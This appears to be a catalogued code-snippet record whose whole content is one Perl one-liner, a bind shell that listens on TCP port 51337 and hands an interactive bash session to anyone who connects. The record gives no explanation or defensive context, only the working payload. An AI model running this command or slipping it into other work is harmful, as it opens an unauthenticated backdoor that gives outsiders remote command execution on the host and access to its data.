---
id: d766cfad-bcb4-4e58-9129-69f123097e39
type: code
language: Perl
verified: false
created_at: '2023-04-06T03:56:08.747844+00:00'
updated_at: '2023-04-10T20:21:16.649307+00:00'
---

# Code Snippet d766cfad

**Language**: Perl

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```


